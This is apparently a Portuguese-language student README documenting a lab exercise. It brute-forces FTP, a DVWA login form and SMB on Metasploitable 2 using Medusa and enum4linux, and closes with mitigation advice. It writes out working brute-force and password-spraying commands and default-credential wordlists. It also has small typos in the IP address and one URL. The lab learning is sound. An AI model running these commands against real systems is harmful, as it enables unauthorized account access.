# Projeto-Santander
Este projeto foi desenvolvido para praticar técnicas de força bruta usando Kali Linux e a ferramenta Medusa em um ambiente controlado. Utilizei o Metasploitable 2 e o DVWA para observar serviços vulneráveis, testar ataques automatizados e registrar comandos, wordlists e aprendizados.
Projeto Prático – Testes de Força Bruta com Kali Linux e Medus


Esse repositório é onde registrei minha experiência usando o Kali Linux junto com o Medusa pra fazer alguns testes de força bruta num ambiente controlado. Usei o Metasploitable 2 e também o DVWA como alvos, o que me ajudou bastante a entender como serviços vulneráveis se comportam quando estão configurados do jeito errado.

A ideia principal aqui foi aprender na prática mesmo: testar, errar, ajustar e ver o que realmente funciona.

Objetivos Principais
entender melhor ataques de força bruta
configurar um laboratório simples e funcional
usar o Medusa de forma mais correta
identificar e tentar mitigar vulnerabilidades
documentar tudo de um jeito que eu consiga entender depois
Ambiente Utilizado

Eu criei duas máquinas no VirtualBox:
Kali Linux (atacante)
Metasploitable 2 (alvo)
As duas ficaram na rede Host-Only, assim não mexe com a rede real.
Pra testar se estavam se enxergando, usei:

ifconfig
ping 192.198.56.101
Wordlists que usei

Criei duas wordlists simples.

senhas.txt
123
admin
password
root
msfadmin


usuarios.txt
msfadmin
user
service

Teste 1 – Ataque FTP com Medusa
O FTP do Metasploitable já é vulnerável por padrão, então foi o primeiro teste.

Comando:
medusa -h 192.198.56.101-u msfadmin -P senhas.txt -M ftp


Resultado:
 Deu pra ver como senha fraca é praticamente deixar a porta aberta.
Teste 2 – Ataque ao Formulário do DVWA

Acessei o DVWA no navegador:

http://192.198,56.101/DVWA


Login padrão:
admin / password


Coloquei o nível de segurança em Low pra facilitar os testes.

Comando:

medusa -h 192.198.56.101 -u admin -P senhas.txt -M web-form -m FORM:"/DVWA/vulnerabilities/brute/?username=&password=&Login=Login:username=^USER^&password=^PASS^:F=Login failed"


Resultado:
O Medusa conseguiu achar a senha e simular o ataque no formulário. Isso ajudou a entender como o processo funciona mesmo num site simples.

Teste 3 – Password Spraying no SMB

Primeiro fiz uma enumeração de usuários:

enum4linux -U 192.198.56.101


Depois tentei password spraying, usando só uma senha contra vários usuários.

Comando:
medusa -h 192.198.56.101 -U usuarios.txt -P senha_unica.txt -M smbnt


Resultado:
Consegui achar pelo menos um usuário com senha fraca. Mostra como um único usuário mal configurado já é suficiente pra quebrar tudo.

Medidas de Mitigação

Algumas coisas que percebi durante os testes:

nada de senha fraca

bloquear tentativas depois de um certo número

usar MFA quando der

usar ferramentas tipo Fail2ban

monitorar logs e acessos suspeitos

desativar serviços que não precisa (FTP por exemplo)

usar senha forte ou chave quando possível

O Que Aprendi

Esse projeto foi muito útil pra entender como um atacante realmente pensa e age.
Ferramentas como Medusa, Enum4linux e DVWA deixam o processo mais visual e fácil de entender.
Também ficou claro como boas práticas de configuração fazem diferença gigante.
